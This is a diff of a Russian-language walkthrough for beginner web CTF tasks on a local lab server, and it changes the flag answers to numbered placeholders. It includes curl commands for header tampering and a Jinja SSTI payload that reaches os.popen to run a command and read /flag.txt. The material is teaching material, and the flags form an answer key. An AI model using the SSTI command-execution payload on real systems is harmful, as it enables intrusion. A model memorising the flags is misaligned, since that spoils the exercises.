@@ -12,14 +12,14 @@
 
 ```console
 $ curl -s http://127.0.0.1:8001/ | grep note-01
-  <!-- note-01: Qm9vdENURntkZWZhdWx0X3dlYl92aWV3X3NvdXJjZX0= -->
+  <!-- note-01: Qm9vdENURntkZWZhdWx0X3dlYl8xfQ== -->
 ```
 
 В комментарии — строка в base64 (кодирование, не шифрование). Декодируем:
 
 ```console
 $ curl -s http://127.0.0.1:8001/ | grep -o 'note-01: [A-Za-z0-9+/=]*' | sed 's/note-01: //' | base64 -d
-BootCTF{default_web_view_source}
+BootCTF{default_web_1}
 ```
 
 *Чему учит:* первый шаг веб-разбора — смотреть, что реально отдаёт сервер. Комментарии
@@ -36,7 +36,7 @@ $ curl -s http://127.0.0.1:8001/js/app.js
   "use strict";
 
   // Служебная заметка аудита: показывается по Ctrl+Shift+Y.
-  var note = [66, 111, 111, 116, 67, 84, 70, 123, 100, 101, 102, 97, 117, 108, 116, 95, 119, 101, 98, 95, 104, 111, 116, 107, 101, 121, 95, 106, 115, 125];
+  var note = [66, 111, 111, 116, 67, 84, 70, 123, 100, 101, 102, 97, 117, 108, 116, 95, 119, 101, 98, 95, 50, 125];
 
   document.addEventListener("keydown", function (e) {
     if (e.ctrlKey && e.shiftKey && (e.key === "Y" || e.key === "y")) {
@@ -53,7 +53,7 @@ $ curl -s http://127.0.0.1:8001/js/app.js
 
 ```console
 $ curl -s http://127.0.0.1:8001/js/app.js | grep -o 'note = \[[0-9, ]*\]' | sed 's/note = \[//;s/\]//' | tr ',' '\n' | awk '{printf "%c",$1}'; echo
-BootCTF{default_web_hotkey_js}
+BootCTF{default_web_2}
 ```
 
 *Чему учит:* логика и «секреты» на стороне клиента (в JS) доступны любому пользователю.
@@ -82,7 +82,7 @@ $ curl -s -X POST http://127.0.0.1:8001/api/secret
 
 ```console
 $ curl -s -X POST -H 'X-Audit-Token: lighthouse' http://127.0.0.1:8001/api/secret
-{"flag": "BootCTF{default_web_api_header}"}
+{"flag": "BootCTF{default_web_3}"}
 ```
 
 *Чему учит:* `curl` позволяет управлять методом и заголовками запроса — то, что не
@@ -106,7 +106,7 @@ $ curl -s "http://127.0.0.1:8001/hello?name=%7B%7B7*7%7D%7D" | grep Здравс
 
 ```console
 $ curl -s "http://127.0.0.1:8001/hello?name=%7B%7Bconfig%7D%7D" | grep -o "AUDIT_NOTE[^}]*}"
-AUDIT_NOTE&#39;: &#39;BootCTF{default_web_ssti_config}
+AUDIT_NOTE&#39;: &#39;BootCTF{default_web_4}
 ```
 
 (HTML-сущности `&#39;` — это экранированные кавычки.) Флаг лежал в `app.config` под
@@ -127,7 +127,7 @@ AUDIT_NOTE&#39;: &#39;BootCTF{default_web_ssti_config}
 
 ```console
 $ curl -s -D - -o /dev/null http://127.0.0.1:8001/ | grep -i x-lighthouse
-X-Lighthouse-Note: BootCTF{default_web_response_header}
+X-Lighthouse-Note: BootCTF{default_web_5}
 ```
 
 *Чему учит:* ответ сервера — это не только тело страницы, но и заголовки; там тоже
@@ -141,7 +141,7 @@ SSTI из флага 4 — это не только арифметика. Чер
 
 ```console
 $ curl -s "http://127.0.0.1:8001/hello?name=%7B%7B+cycler.__init__.__globals__.os.popen('cat%20/flag.txt').read()+%7D%7D" | grep Здравствуйте
-    <p class="greeting">Здравствуйте, BootCTF{default_web_ssti_rce}
+    <p class="greeting">Здравствуйте, BootCTF{default_web_6}
 ```
 
 Выражение `cycler.__init__.__globals__.os.popen('cat /flag.txt').read()` проходит от
